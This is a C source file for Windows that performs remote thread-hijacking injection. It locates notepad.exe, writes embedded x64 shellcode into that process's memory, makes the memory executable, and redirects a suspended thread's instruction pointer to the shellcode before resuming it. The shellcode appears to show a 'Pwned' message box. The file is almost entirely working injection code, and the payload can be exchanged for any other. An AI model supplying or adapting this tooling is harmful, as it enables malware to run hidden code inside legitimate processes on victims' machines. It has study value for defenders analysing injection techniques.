#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD get_pid_from_proc_name(IN LPCSTR lpProcessName) {
    DWORD PID = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to take snapshot\n");
        return 0;
    }

    if (!Process32First(snapshot, &pe32)) {
        printf("[-] Failed to get first process\n");
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (strcmpi(pe32.szExeFile, lpProcessName) == 0) {
            printf("[+] Found ! PID: %u - %s\n", pe32.th32ProcessID, pe32.szExeFile);
            PID = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(snapshot, &pe32));

    CloseHandle(snapshot);
    return PID;
}

BOOL get_proc_thread(IN LPCSTR lpProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread){
    HANDLE         hSnapShot  = NULL;
	/*
	typedef struct tagTHREADENTRY32 {
		DWORD dwSize;
		DWORD cntUsage;
		DWORD th32ThreadID;
		DWORD th32OwnerProcessID;
		LONG  tpBasePri;
		LONG  tpDeltaPri;
		DWORD dwFlags;
	} THREADENTRY32;
	*/
	THREADENTRY32  Thr        = {
		.dwSize = sizeof(THREADENTRY32)
	};

	DWORD PID = get_pid_from_proc_name(lpProcessName);

	// Takes a snapshot of the currently running processes's threads 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}
	printf("[+] Snapshot taken w/ TH32CS_SNAPTHREAD \n");

	// Retrieves information about the first thread encountered in the snapshot.
	if (!Thread32First(hSnapShot, &Thr)) {
		printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		// If the thread's PID is equal to the PID of the target process then
		// this thread is running under the target process
		if (Thr.th32OwnerProcessID == PID){
			/*
				THREAD_GET_CONTEXT
				THREAD_SET_CONTEXT
				THREAD_SUSPEND_RESUME
			*/	
			*hThread     = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, Thr.th32ThreadID);
			printf("[+] Thread %d will be hijacked\n", Thr.th32ThreadID);
			
			if (*hThread == NULL)
				printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());

			break;
		}

	// While there are threads remaining in the snapshot
	} while (Thread32Next(hSnapShot, &Thr));

	/*
		PROCESS_VM_OPERATION > pour VirtualAllocEx, VirtualProtectEx.
		PROCESS_VM_WRITE > pour WriteProcessMemory.
	*/
	*hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID);

_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	return TRUE;
}

int hijack_remote_dummy(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, size_t sPayloadSize) {
    DWORD dwOldProtection = 0;
    PVOID   pAddress        = NULL;
	size_t   bytesWritten    = 0;
	CONTEXT ThreadCtx       = { 
		.ContextFlags = CONTEXT_FULL 
	};

    // Allocating memory for the payload
	pAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL){
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
    printf("[+] Shellcode space allocated at 0x%p w/ RW\n", pAddress);

	// Copying the payload to the allocated memory
	WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &bytesWritten);
    printf("[+] Shellcode written in code cave\n");

	// Changing the memory protection
	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
    printf("[+] protection flag setted to RX \n");

	if (!FlushInstructionCache(hProcess, pAddress, sPayloadSize)) {
        printf("[-] FlushInstructionCache Failed : %lu\n", GetLastError());
        // On continue quand même, mais c'est un red flag
    }
	SuspendThread(hThread);
	printf("[+] Hijacked thread suspended !\n");

    // Getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)){
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
    printf("[+] Thread context grabbed\n");

    // On change le registre RIP avec l'addr de notre shellcode
    printf("[+] Setting context.RIP from 0x%p to 0x%p\n", ThreadCtx.Rip, pAddress);
	ThreadCtx.Rip = (DWORD64)pAddress;

    // Updating the new thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
    printf("[+] Hijacked context applied to thread !\n");

	ResumeThread(hThread);
    printf("[+] hijacked thread resumed !\n");

	return TRUE;
}

int main(int argc, char** argv){
    UCHAR shellcode_64[] = 
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60"
        "\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
        "\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
        "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
        "\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x8b"
        "\x48\x18\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
        "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
        "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
        "\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
        "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
        "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
        "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x11"
        "\x00\x00\x00\x49\x6e\x6a\x65\x63\x74\x65\x64\x20\x62\x79"
        "\x20\x52\x69\x64\x61\x00\x5a\xe8\x06\x00\x00\x00\x50\x77"
        "\x6e\x65\x64\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56"
        "\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d"
        "\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
        "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
    size_t shellcode_64_sz = sizeof(shellcode_64);

    LPCSTR lpProcessName = "notepad.exe";
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;

    get_proc_thread("notepad.exe", &hProcess, &hThread);

    printf("[+] Remote Process's thread obtained (%s) !\n", lpProcessName);

    if(!hijack_remote_dummy(hProcess, hThread, (PBYTE)&shellcode_64, shellcode_64_sz)) {
        printf("[-] hijack_dummy Failed : %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Local Thread hijacked !\n");

    printf("[+] Waiting fo thread !\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Done !\n");
        
    return 0;
}